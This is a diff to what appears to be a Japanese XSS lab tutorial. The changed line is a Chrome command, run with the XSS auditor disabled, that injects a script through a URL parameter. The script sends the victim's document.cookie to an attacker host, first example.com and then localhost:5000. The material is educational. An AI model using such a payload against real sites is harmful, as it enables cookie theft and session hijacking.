@@ -47,7 +47,7 @@ $ google-chrome http://localhost:5000
 1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)
 
 ```bash
-$ google-chrome --disable-xss-auditor "http://脆弱サイト.com/status?uid=%3Cscript%3Ewindow.location=%22http://example.com/?cookie=%22%2bdocument.cookie%3C/script%3E"
+$ google-chrome --disable-xss-auditor "http://脆弱サイト.com/status?uid=%3Cscript%3Ewindow.location=%22http://localhost:5000/?cookie=%22%2bdocument.cookie%3C/script%3E"
 ```
 
 _注意: まともなブラウザなら，単純なXSS攻撃は検知してscript実行を中止する．`--disable-xss-auditor`によってchromeにわざとXSS攻撃に引っかかってもらう．_
